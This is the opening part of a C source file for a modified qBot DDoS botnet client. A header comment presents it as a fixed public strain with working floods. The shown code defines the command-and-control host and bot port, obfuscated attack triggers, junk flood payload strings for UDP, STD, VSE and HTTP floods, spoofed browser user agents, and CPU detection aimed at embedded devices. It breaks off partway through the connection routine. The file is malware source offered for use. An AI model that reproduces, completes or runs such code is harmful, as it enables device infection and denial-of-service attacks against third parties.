/*
    Permission To Use, Copy, Modify, And Distribute This Ware And Its Documentation For Education And Research, Without Fee Or A Signed Agreement, Is Granted,-
    Provided That This And The Following Two Paragraphs Appear In All Copies, Modifications, And Distributions. (Feb. 2020)

    This Ware Is Offered As-Is and As-Available, And Makes No Representations Or Warranties Of Any Kind Concerning This Material, Whether Express, Implied, Statutory, Or Other.
    This Includes, Without Limitation, Warranties Of Title, Merchantability, Fitness For A Particular Purpose, Non-Infringement, Absence Of Latent Or Other Defects, Accuracy,-
    Or The Presence Or Absence Of Errors, Whether Or Not Known Or Discoverable.

    To The Extent Possible, In No Event Shall The Author Be Liable To You On Any Legal Theory (Including, Without Limitation, Negligence)
    Or Otherwise For Any Direct, Indirect, Special, Incidental, Consequential, Punitive, Exemplary,-
    Or Any Other Losses, Costs, Expenses, Or Damages (Including, But Not Limited To, Loss Of Use, Data, Profits, Or Business Interruption)-
    However Caused, And On Any Theory Of Liability, Whether In Contract, Strict Liability, Or Tort (Including Negligence Or Otherwise)-
    Arising Out Of This Public Release, Or Use Of This Ware, Even If The User Has Been Advised Of The Possibility Of Such Losses, Costs, Expenses, Or Damages.
*/
/*
	Only Fixed Because Many People Were Attempting To Work With This Code, And Ended Up Basically Rendering It Useless
	This Is The Malware Strain That 90% Of These DDoS Kids Use - Feel Free To RE It 

    Just A Public qBot, Fixed And Modded By Tragedy.
    Storing Address In Array
    Added A Basic Encryption That You Can Modify
    Made All The Floods Actually Work... HTTP Flood Was Waiting For 3 Extra Unpassed Parameters...
    STD Hex Wasn't Even Selecting A Random String
    The Same Functions Were In Here Like 3 Times, All Named Differently, And Each Called In Different Parent Functions...
    Yeah, That Pretty Much Sums Up What It Was Like Fixing All Of This Shit
   
*/
#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>           

//[+]=================================[+]
//Host Info
int host1[] = {1}; //x.1.1.1
int host2[] = {1}; //1.x.1.1
int host3[] = {1}; //1.1.x.1
int host4[] = {1}; //1.1.1.x
int host_bp = 666; //Desired Bot Port
#define sv_sz (sizeof(host1), sizeof(host2), sizeof(host3), sizeof(host4))

//Encrypted Triggers
char udp_arg[] = {"I&,"};
char tcp_arg[] = {"KE,"};
char std_arg[] = {"@K&"};
char xms_arg[] = {"}?~@"};
char vse_arg[] = {"P@-"};
char http_arg[] = {"VYY,"};
//Encrypted Numerical String.. Being Sent By Your C2
            //0123456789
char *nstr = "_(#+[];&:)";
//If You Can't Figure Out How To Add The Enc To Your CNC
//        You Can Pay Me To Do It For You
//[+]=================================[+]
int C2Sock = 0, C2Host = -1, FRSTSV = -1; //CNC Socket Variables

uint32_t *pids; //Process Identifiers
uint64_t numpids = 0;

struct in_addr ourIP;
unsigned char macAddress[6] = {0};

#define PHI 0x9e3779b9 //Variables For Rand Generators
static uint32_t Q[4096], c = 362436;
static uint32_t x, y, z, w;

//Define Packet Constants
#define STD_PSIZE 1460 //STD Flood Packet Size, Don't Make It Huge
    //STD Strings
const char *randstrings[] = {
    "RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM..."
    "\x64\x61\x79\x7a\x64\x64\x6f\x73\x2e\x63\x6f\x20\x72\x75\x6e\x73\x20\x79\x6f\x75\x20\x69\x66\x20\x79\x6f\x75\x20\x72\x65\x61\x64\x20\x74\x68\x69\x73\x20\x6c\x6f\x6c\x20\x74\x68\x65\x6e\x20\x79\x6f\x75\x20\x74\x63\x70\x20\x64\x75\x6d\x70\x65\x64\x20\x69\x74\x20\x62\x65\x63\x61\x75\x73\x65\x20\x69\x74\x20\x68\x69\x74\x20\x79\x6f\x75\x20\x61\x6e\x64\x20\x79\x6f\x75\x20\x6e\x65\x65\x64\x20\x74\x6f\x20\x70\x61\x74\x63\x68\x20\x69\x74\x20\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x64\x61\x79\x7a\x64\x64\x6f\x73\x2e\x63\x6f\x20\x72\x75\x6e\x73\x20\x79\x6f\x75\x20\x69\x66\x20\x79\x6f\x75\x20\x72\x65\x61\x64\x20\x74\x68\x69\x73\x20\x6c\x6f\x6c\x20\x74\x68\x65\x6e\x20\x79\x6f\x75\x20\x74\x63\x70\x20\x64\x75\x6d\x70\x65\x64\x20\x69\x74\x20\x62\x65\x63\x61\x75\x73\x65\x20\x69\x74\x20\x68\x69\x74\x20\x79\x6f\x75\x20\x61\x6e\x64\x20\x79\x6f\x75\x20\x6e\x65\x65\x64\x20\x74\x6f\x20\x70\x61\x74\x63\x68\x20\x69\x74\x20\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x64\x61\x79\x7a\x64\x64\x6f\x73\x2e\x63\x6f\x20\x72\x75\x6e\x73\x20\x79\x6f\x75\x20\x69\x66\x20\x79\x6f\x75\x20\x72\x65\x61\x64\x20\x74\x68\x69\x73\x20\x6c\x6f\x6c\x20\x74\x68\x65\x6e\x20\x79\x6f\x75\x20\x74\x63\x70\x20\x64\x75\x6d\x70\x65\x64\x20\x69\x74\x20\x62\x65\x63\x61\x75\x73\x65\x20\x69\x74\x20\x68\x69\x74\x20\x79\x6f\x75\x20\x61\x6e\x64\x20\x79\x6f\x75\x20\x6e\x65\x65\x64\x20\x74\x6f\x20\x70\x61\x74\x63\x68\x20\x69\x74\x20\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x64\x61\x79\x7a\x64\x64\x6f\x73\x2e\x63\x6f\x20\x72\x75\x6e\x73\x20\x79\x6f\x75\x20\x69\x66\x20\x79\x6f\x75\x20\x72\x65\x61\x64\x20\x74\x68\x69\x73\x20\x6c\x6f\x6c\x20\x74\x68\x65\x6e\x20\x79\x6f\x75\x20\x74\x63\x70\x20\x64\x75\x6d\x70\x65\x64\x20\x69\x74\x20\x62\x65\x63\x61\x75\x73\x65\x20\x69\x74\x20\x68\x69\x74\x20\x79\x6f\x75\x20\x61\x6e\x64\x20\x79\x6f\x75\x20\x6e\x65\x65\x64\x20\x74\x6f\x20\x70\x61\x74\x63\x68\x20\x69\x74\x20\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x6f\x6c",
    "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A",
    "\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F",
    "\x0D\x1E\x1F\x12\x06\x62\x26\x12\x62\x0D\x12\x01\x06\x0D\x1C\x01\x32\x12\x6C\x63\x1B\x32\x6C\x63\x3C\x32\x62\x63\x6C\x26\x12\x1C\x12\x6C\x63\x62\x06\x12\x21\x2D\x32\x62\x11\x2D\x21\x32\x62\x10\x12\x01\x0D\x12\x30\x21\x2D\x30\x13\x1C\x1E\x10\x01\x10\x3E\x3C\x32\x37\x01\x0D\x10\x12\x12\x30\x2D\x62\x10\x12\x1E\x10\x0D\x12\x1E\x1C\x10\x12\x0D\x01\x10\x12\x1E\x1C\x30\x21\x2D\x32\x30\x2D\x30\x2D\x21\x30\x21\x2D\x3E\x13\x0D\x32\x20\x33\x62\x63\x12\x21\x2D\x3D\x36\x12\x62\x30\x61\x11\x10\x06\x00\x17\x22\x63\x2D\x02\x01\x6C\x6D\x36\x6C\x0D\x02\x16\x6D\x63\x12\x02\x61\x17\x63\x20\x22\x6C\x2D\x02\x63\x6D\x37\x22\x63\x6D\x00\x02\x2D\x22\x63\x6D\x17\x22\x2D\x21\x22\x63\x00\x30\x32\x60\x30\x00\x17\x22\x36\x36\x6D\x01\x6C\x0D\x12\x02\x61\x20\x62\x63\x17\x10\x62\x6C\x61\x2C\x37\x22\x63\x17\x0D\x01\x3D\x22\x63\x6C\x17\x01\x2D\x37\x63\x62\x00\x37\x17\x6D\x63\x62\x37\x3C\x54\x0D\x1E\x1F\x12\x06\x62\x26\x12\x62\x0D\x12\x01\x06\x0D\x1C\x01\x32\x12\x6C\x63\x1B\x32\x6C\x63\x3C\x32\x62\x63\x6C\x26\x12\x1C\x12\x6C\x63\x62\x06\x12\x21\x2D\x32\x62\x11\x2D\x21\x32\x62\x10\x12\x01\x0D\x12\x30\x21\x2D\x30\x13\x1C\x1E\x10\x01\x10\x3E\x3C\x32\x37\x01\x0D\x10\x12\x12\x30\x2D\x62\x10\x12\x1E\x10\x0D\x12\x1E\x1C\x10\x12\x0D\x01\x10\x12\x1E\x1C\x30\x21\x2D\x32\x30\x2D\x30\x2D\x21\x30\x21\x2D\x3E\x13\x0D\x32\x20\x33\x62\x63\x12\x21\x2D\x3D\x36\x12\x62\x30\x61\x11\x10\x06\x00\x17\x22\x63\x2D\x02\x01\x6C\x6D\x36\x6C\x0D\x02\x16\x6D\x63\x12\x02\x61\x17\x63\x20\x22\x6C\x2D\x02\x63\x6D\x37\x22\x63\x6D\x00\x02\x2D\x22\x63\x6D\x17\x22\x2D\x21\x22\x63\x00\x30\x32\x60\x30\x00\x17\x22\x36\x36\x6D\x01\x6C\x0D\x12\x02\x61\x20\x62\x63\x17\x10\x62\x6C\x61\x2C\x37\x22\x63\x17\x0D\x01\x3D\x22\x63\x6C\x17\x01\x2D\x37\x63\x62\x00\x37\x17\x6D\x63\x62\x37\x3C\x54",
    "\x26\x3C\x35\x35\x36\x3D\x20\x77\x75\x31\x76\x35\x30\x77\x28\x7D\x27\x29\x7D\x7D\x34\x36\x3C\x21\x73\x30\x2D\x2D\x29\x77\x77\x2A\x2B\x32\x37\x2F\x2B\x72\x73\x22\x36\x7C\x31\x24\x21\x73\x7C\x28\x36\x77\x72\x34\x72\x24\x70\x2E\x2B\x3F\x28\x26\x23\x24\x2F\x71\x7D\x7C\x72\x7C\x74\x26\x28\x21\x32\x2F\x23\x33\x20\x20\x2C\x2F\x7C\x20\x23\x28\x2A\x2C\x20\x2E\x36\x73\x2A\x27\x74\x31\x7D\x20\x33\x2C\x30\x29\x72\x3F\x73\x23\x30\x2D\x34\x74\x2B\x2E\x37\x73\x2F\x2B\x71\x35\x2C\x34\x2C\x36\x34\x3D\x28\x24\x27\x29\x71\x2A\x26\x30\x77\x35\x2F\x35\x35\x37\x2E\x2F\x28\x72\x27\x23\x2F\x2D\x76\x31\x36\x74\x30\x29\x45\x26\x3C\x35\x35\x36\x3D\x20\x77\x75\x31\x76\x35\x30\x77\x28\x7D\x27\x29\x7D\x7D\x34\x36\x3C\x21\x73\x30\x2D\x2D\x29\x77\x77\x2A\x2B\x32\x37\x2F\x2B\x72\x73\x22\x36\x7C\x31\x24\x21\x73\x7C\x28\x36\x77\x72\x34\x72\x24\x70\x2E\x2B\x3F\x28\x26\x23\x24\x2F\x71\x7D\x7C\x72\x7C\x74\x26\x28\x21\x32\x2F\x23\x33\x20\x20\x2C\x2F\x7C\x20\x23\x28\x2A\x2C\x20\x2E\x36\x73\x2A\x27\x74\x31\x7D\x20\x33\x2C\x30\x29\x72\x3F\x73\x23\x30\x2D\x34\x74\x2B\x2E\x37\x73\x2F\x2B\x71\x35\x2C\x34\x2C\x36\x34\x3D\x28\x24\x27\x29\x71\x2A\x26\x30\x77\x35\x2F\x35\x35\x37\x2E\x2F\x28\x72\x27\x23\x2F\x2D\x76\x31\x36\x74\x30\x29\x45\x26\x3C\x35\x35\x36\x3D\x20\x77\x75\x31\x76\x35\x30\x77\x28\x7D\x27\x29\x7D\x7D\x34\x36\x3C\x21\x73\x30\x2D\x2D\x29\x77\x77\x2A\x2B\x32\x37\x2F\x2B\x72\x73\x22\x36\x7C\x31\x24\x21\x73\x7C\x28\x36\x77\x72\x34\x72\x24\x70\x2E\x2B\x3F\x28\x26\x23\x24\x2F\x71\x7D\x7C\x72\x7C\x74\x26\x28\x21\x32\x2F\x23\x33\x20\x20\x2C\x2F\x7C\x20\x23\x28\x2A\x2C\x20\x2E\x36\x73\x2A\x27\x74\x31\x7D\x20\x33\x2C\x30\x29\x72\x3F\x73\x23\x30\x2D\x34\x74\x2B\x2E\x37\x73\x2F\x2B\x71\x35\x2C\x34\x2C\x36\x34\x3D\x28\x24\x27\x29\x71\x2A\x26\x30\x77\x35\x2F\x35\x35\x37\x2E\x2F\x28\x72\x27\x23\x2F\x2D\x76\x31\x36\x74\x30\x29\x45",
    "3pWjHntL6F0Ckev2IiaMl4w5OJcryKYSdgso7hZPm8GbXq9E1VxNTQuDzAfURB7s8TrJOMjgHt1IvVCu4YEq3FAeom6b5NiKwzkG9hQyxPXZfWSDlcdnR0Bp2LaUHn38cyfrBLJMAtlvEYC9da5QUeIz1G0hRqpTF72X4xwSODjoukVWib6mZPsNgK3pWjHntL6F0Ckev2IiaMl4w5OJcryKYSdgso7hZPm8GbXq9E1VxNTQuDzAfURB7s8TrJOMjgHt1IvVCu4YEq3FAeom6b5NiKwzkG9hQyxPXZfWSDlcdnR0Bp2LaUHn38cyfrBLJMAtlvEYC9da5QUeIz1G0hRqpTF72X4xwSODjoukVWib6mZPsNgK3pWjHntL6F0Ckev2IiaMl4w5OJcryKYSdgso7hZPm8GbXq9E1VxNTQuDzAfURB7s8TrJOMjgHt1IvVCu4YEq3FAeom6b5NiKwzkG9hQyxPXZfWSDlcdnR0Bp2LaUHn38cyfrBLJMAtlvEYC9da5QUeIz1G0hRqpTF72X4xwSODjoukVWib6mZPsNgK3pWjHntL6F0Ckev2IiaMl4w5OJcryKYSdgso7hZPm8GbXq9E1VxNTQuDzAfURB7s8TrJOMjgHt1IvVCu4YEq3FAeom6b5NiKwzkG9hQyxPXZfWSDlcdnR0Bp2LaUHn38cyfrBLJMAtlvEYC9da5QUeIz1G0hRqpTF72X4xwSODjoukVWib6mZPsNgK3pWjHntL6F0Ckev2IiaMl4w5OJcryKYSdgso7hZPm8GbXq9E1VxNTQuDzAfURB7s8TrJOMjgHt1IvVCu4YEq3FAeom6b5NiKwzkG9hQyxPXZfWSDlcdnR0Bp2LaUHn38cyfrBLJMAtlvEYC9da5QUeIz1G0hRqpTF72X4xwSODjoukVWib6mZPsNgK3pWjHntL6F0Ckev2IiaMl4w5OJcryKYSdgso7hZPm8GbXq9E1VxNTQuDzAfURB7s8TrJOMjgHt1IvVCu4YEq3FAeom6b5NiKwzkG9hQyxPXZfWSDlcdnR0Bp2LaUHn38cyfrBLJMAtlvEYC9da5QUeIz1G0hRqpTF72X4xwSODjoukVWib6mZPsNgK3pWjHntL6F0Ckev2IiaMl4w5OJcryKYSdgso7hZPm8GbXq9E1VxNTQuDzAfURB7s8TrJOMjgHt1IvVCu4YEq3FAeom6b5NiKwzkG9hQyxPXZfWSDlcdnR0Bp2LaUHn38cyfrBLJMAtlvEYC9da5QUeIz1G0hRqpTF72X4xwSODjoukVWib6mZPsNgK3pWjHntL6F0Ckev2IiaMl4w5OJcryKYSdgso7hZPm8GbXq9E1VxNTQuDzAfURB7s8TrJOMjgHt1IvVCu4YEq3FAeom6b5NiKwzkG9hQyxPXZfWSDlcdnR0Bp2LaUHn38cyfrBLJMAtlvEYC9da5QUeIz1G0hRqpTF72X4xwSODjoukVWib6mZPsNgK3pWjHntL6F0Ckev2IiaMl4w5OJcryKYSdgso7hZPm8GbXq9E1VxNTQuDzAfURB7s8TrJOMjgHt1IvVCu4YEq3FAeom6b5NiKwzkG9hQyxPXZfWSDlcdnR0Bp2LaUHn38cyfrBLJMAtlvEYC9da5QUeIz1G0hRqpTF72X4xwSODjoukVWib6mZPsNgK3pWjHntL6F0Ckev2IiaMl4w5OJcryKYSdgso7hZPm8GbXq9E1VxNTQuDzAfURB7s8TrJOMjgHt1IvVCu4YEq3F"
};
//VSE
int vse_payload_len;
char *vse_payload = {"\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79 + /x54/x53/x6f/x75/x72/x63/x65/x20/x45/x6e/x67/x69/x6e/x65/x20/x51/x75/x65/x72/x79 rfdknjms", &vse_payload_len};
//HTTP 
    //User Agents Payload
const char http_payload[2048] = {"\x77\x47\x5E\x27\x7A\x4E\x09\xF7\xC7\xC0\xE6\xF5\x9B\xDC\x23\x6E\x12\x29\x25\x1D\x0A\xEF\xFB\xDE\xB6\xB1\x94\xD6\x7A\x6B\x01\x34\x26\x1D\x56\xA5\xD5\x8C\x91\xBC\x8B\x96\x29\x6D\x4E\x59\x38\x4F\x5C\xF0\xE2\xD1\x9A\xEA\xF8\xD0\x61\x7C\x4B\x57\x2E\x7C\x59\xB7\xA5\x84\x99\xA4\xB3\x8E\xD1\x65\x46\x51\x30\x77\x44\x08\xFA\xD9\x92\xE2\xF0\xC8\xD5\x60\x77\x52\x6D\x21\x02\x1D\xFC\xB3\x80\xB4\xA6\x9D\xD4\x28\x24\x03\x5A\x35\x14\x5B\xA8\xE0\x8A\x9A\xE8\xC0\x91\x6C\x7B\x47\x5E\x6C\x69\x47\xB5\xB4\x89\xDC\xAF\xAA\xC1\x2E\x6A\x04\x10\x6E\x7A\x1C\x0C\xF9\xCC\xC0\xA0\xF8\xC8\xD6\x2E\x0A\x12\x6E\x76\x42\x5A\xA6\xBE\x9F\xA6\xB1\x90\xD7\x24\x64\x15\x1C\x20\x0A\x19\xA8\xF9\xDE\xD1\xBE\x96\x95\x64\x38\x4C\x53\x3C\x40\x56\xD1\xC5\xED\xE8\x90\xB0\xD2\x22\x68\x06\x5B\x38\x33\x00\xF4\xF3\xC6\x96\xE5\xFA\xCA\xD8\x30\x0D\x50\x23\x2E\x45\x52\xF6\x80\x94"};
    //Captcha Request Payload
const char http_cap[2048] = {"\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA"};
    //The Gang
const char *useragents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
    "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
};

char *DevArch(){
    #if defined(__x86_64__) || defined(_M_X64)
    return "x86_64";
    #elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)
    return "x86_32";
    #elif defined(__ARM_ARCH_2__) || defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__) || defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    return "armv4";
    #elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
    return "armv5"
    #elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_) ||defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__) || defined(__aarch64__)
    return "armv6";
    #elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "armv7";
    #elif defined(mips) || defined(__mips__) || defined(__mips)
    return "mips";
    #elif defined(mipsel) || defined (__mipsel__) || defined (__mipsel) || defined (_mipsel)
    return "mipsel";
    #elif defined(__sh__)
    return "sh4";
    #elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__ppc64__) || defined(__PPC__) || defined(__PPC64__) || defined(_ARCH_PPC) || defined(_ARCH_PPC64)
    return "ppc";
    #elif defined(__sparc__) || defined(__sparc)
    return "sparc";
    #elif defined(__m68k__)
    return "m68k";
    #else
    return "unknown";
    #endif
}

int getHost(unsigned char *toGet, struct in_addr *i){
    struct hostent *h;
    if((i->s_addr = inet_addr(toGet)) == -1) return 1;
    return 0;
}
int socket_connect(char *host, in_port_t port){
    struct hostent *hp;
    struct sockaddr_in addr;
    int on = 1, sock;

    if((hp = gethostbyname(host)) == NULL) return 0;
